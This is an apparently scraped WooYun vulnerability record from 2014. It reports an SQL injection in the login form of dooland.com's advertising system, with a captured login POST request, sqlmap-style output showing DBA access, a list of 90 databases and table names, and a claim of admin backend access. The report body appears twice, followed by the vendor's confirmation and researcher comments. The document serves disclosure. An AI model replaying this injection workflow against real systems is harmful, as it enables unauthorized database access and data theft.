{"id": 58187, "wybug_id": "wooyun-2014-052009", "wybug_title": "读览天下高权限注入N多库", "wybug_corp": "dooland.com", "wybug_author": "小胖子", "wybug_date": "2014-02-26 12:36", "wybug_open_date": "2014-04-12 12:37", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-12：\t细节向公众公开  简要描述： 不知道重复没有，xsser骗我20WB 刷回来 详细说明：  系统地址：http://e.dooland.com/  广告系统。登陆存在注入。\n\n抓登陆包\nPOST /?action=login HTTP/1.1Host: e.dooland.comProxy-Connection: keep-aliveContent-Length: 31Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://e.dooland.comUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.66 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://e.dooland.com/Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=0326k6lvnaoiopagcb82cra9j3username=1&password=1&x=17&y=10\n果断是注入：[20:32:58] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.10back-end DBMS: MySQL 5.0[20:32:58] [INFO] fetching current database[20:32:58] [WARNING] reflective value(s) found and filtering out[20:32:58] [INFO] retrieved: adscurrent database:    'ads'[20:32:58] [INFO] testing if current user is DBA[20:32:58] [INFO] fetching current user[20:32:58] [INFO] retrieved: dbadm@121.9.213.7current user is DBA:    TrueDBA权限  90个库 是找到大库房了available databases [90]:[*] A_Bank[*] ads[*] adstat[*] adsystem[*] ahvnet[*] api_site_chinagames[*] api_site_tttz[*] asus[*] bbappnet[*] billwang[*] business[*] client[*] collector[*] common[*] cover[*] dayoo[*] dongyou[*] DoolandERP[*] doolandmanager[*] DownLoadInfoDB[*] dudubao[*] dudubao_bak[*] dudubao_book[*] dudubao_gztv[*] dudubao_hd[*] eben[*] expand[*] fhxxw[*] gdvnet[*] gdvnet2[*] gdwap[*] gxvnet[*] gzvnet[*] hzkzy[*] ifeng[*] information_schema[*] ipad_adsys[*] JIANBAO[*] jigou[*] jsvnet[*] jxvnet[*] kindle_caixin[*] kuanzon[*] lcbook[*] lephone[*] lib[*] mag_pub[*] magazine_upload[*] mysql[*] news[*] newspaper[*] OEM[*] opds_aldiko[*] paycenter[*] qinghua[*] qqcaibei[*] readstat[*] ReadStat[*] sctfds[*] scvnet[*] seo[*] shop_car[*] sina_book[*] sina_mag_cooperation[*] stat_dudubao[*] stat_gxvnet[*] stat_jxvnet[*] stat_paihang[*] suzhmobile[*] system_check[*] test[*] tob_client[*] ty189[*] ty189_mail[*] ty189_mail_hd[*] ty189_mail_new[*] ty189_mail_test[*] ucenter[*] unicom[*] union[*] vip_statistics[*] vnet139[*] wangyi163[*] wap[*] xjvnet[*] ynvnet[*] zazhishe[*] zhongshan[*] zhuanti[*] zjvnet当前库ads的表Database: ads[38 tables]+----------------------------+| Client_ad                  || Client_stat                || ad_photo                   || ad_photo_bak               || ad_photo_bak2              || ad_photo_bak3              || ad_send                    || ad_send_20100115           || ad_send_bak                || ad_send_bak2               || ad_send_bak20100107        || ad_send_bak20100112        || area                       || area_bak                   || click_2010_area            || conn                       || conn_20101125              || conn_bak                   || conn_bak1                  || fhxxw_ad_photo             || fhxxw_count                || keywords_ad                || keywords_ad_bak_20090107   || magazine_page              || magazine_page_bak1         || magazine_page_bak2         || magazine_page_bak20090107  || magazine_photo             || magazine_photo_2010118     || magazine_photo_bak20090107 || magazine_photo_bak20090112 || news                       || stat                       || stat_2010_area             || tag_ad                     || tag_products               || user                       || user_bak                   |+----------------------------+最后找到admin的密码 进入后台，可删增广告。\n\n   漏洞证明：  系统地址：e.dooland.com/  广告系统。登陆存在注入。\n\n抓登陆包\nPOST /?action=login HTTP/1.1Host: e.dooland.comProxy-Connection: keep-aliveContent-Length: 31Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://e.dooland.comUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.66 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://e.dooland.com/Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=0326k6lvnaoiopagcb82cra9j3username=1&password=1&x=17&y=10\n果断是注入：[20:32:58] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.10back-end DBMS: MySQL 5.0[20:32:58] [INFO] fetching current database[20:32:58] [WARNING] reflective value(s) found and filtering out[20:32:58] [INFO] retrieved: adscurrent database:    'ads'[20:32:58] [INFO] testing if current user is DBA[20:32:58] [INFO] fetching current user[20:32:58] [INFO] retrieved: dbadm@121.9.213.7current user is DBA:    TrueDBA权限  90个库 是找到大库房了available databases [90]:[*] A_Bank[*] ads[*] adstat[*] adsystem[*] ahvnet[*] api_site_chinagames[*] api_site_tttz[*] asus[*] bbappnet[*] billwang[*] business[*] client[*] collector[*] common[*] cover[*] dayoo[*] dongyou[*] DoolandERP[*] doolandmanager[*] DownLoadInfoDB[*] dudubao[*] dudubao_bak[*] dudubao_book[*] dudubao_gztv[*] dudubao_hd[*] eben[*] expand[*] fhxxw[*] gdvnet[*] gdvnet2[*] gdwap[*] gxvnet[*] gzvnet[*] hzkzy[*] ifeng[*] information_schema[*] ipad_adsys[*] JIANBAO[*] jigou[*] jsvnet[*] jxvnet[*] kindle_caixin[*] kuanzon[*] lcbook[*] lephone[*] lib[*] mag_pub[*] magazine_upload[*] mysql[*] news[*] newspaper[*] OEM[*] opds_aldiko[*] paycenter[*] qinghua[*] qqcaibei[*] readstat[*] ReadStat[*] sctfds[*] scvnet[*] seo[*] shop_car[*] sina_book[*] sina_mag_cooperation[*] stat_dudubao[*] stat_gxvnet[*] stat_jxvnet[*] stat_paihang[*] suzhmobile[*] system_check[*] test[*] tob_client[*] ty189[*] ty189_mail[*] ty189_mail_hd[*] ty189_mail_new[*] ty189_mail_test[*] ucenter[*] unicom[*] union[*] vip_statistics[*] vnet139[*] wangyi163[*] wap[*] xjvnet[*] ynvnet[*] zazhishe[*] zhongshan[*] zhuanti[*] zjvnet当前库ads的表Database: ads[38 tables]+----------------------------+| Client_ad                  || Client_stat                || ad_photo                   || ad_photo_bak               || ad_photo_bak2              || ad_photo_bak3              || ad_send                    || ad_send_20100115           || ad_send_bak                || ad_send_bak2               || ad_send_bak20100107        || ad_send_bak20100112        || area                       || area_bak                   || click_2010_area            || conn                       || conn_20101125              || conn_bak                   || conn_bak1                  || fhxxw_ad_photo             || fhxxw_count                || keywords_ad                || keywords_ad_bak_20090107   || magazine_page              || magazine_page_bak1         || magazine_page_bak2         || magazine_page_bak20090107  || magazine_photo             || magazine_photo_2010118     || magazine_photo_bak20090107 || magazine_photo_bak20090112 || news                       || stat                       || stat_2010_area             || tag_ad                     || tag_products               || user                       || user_bak                   |+----------------------------+最后找到admin的密码 进入后台，可删增广告。\n\n   修复方案：  0x1：数据过滤。0x2：求20rank抚慰心灵。   版权声明：转载请注明来源 小胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-02-27 11:29 厂商回复： 已过滤 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-26 12:46 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  这厂商是小厂商吧？    \n     2014-02-26 12:52 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @niliu 恩 每次到我 就是小厂商了，MLGBD    \n     2014-02-26 12:59 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @小胖子 昨天我也看到了，一看“相关厂商：  dooland.com”  只要是英文域名的就是小厂商了    \n     2014-02-28 18:28 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @niliu 审核员经常都不知道怎么走大走小，有的时候英文域名的二级厂商也走首页，说是影响大，这个漏洞也影响大为什么走小的。好无语是不是？    \n     2014-03-01 19:20 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @U神 是，可能对小胖儿要求比较高 哈哈    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}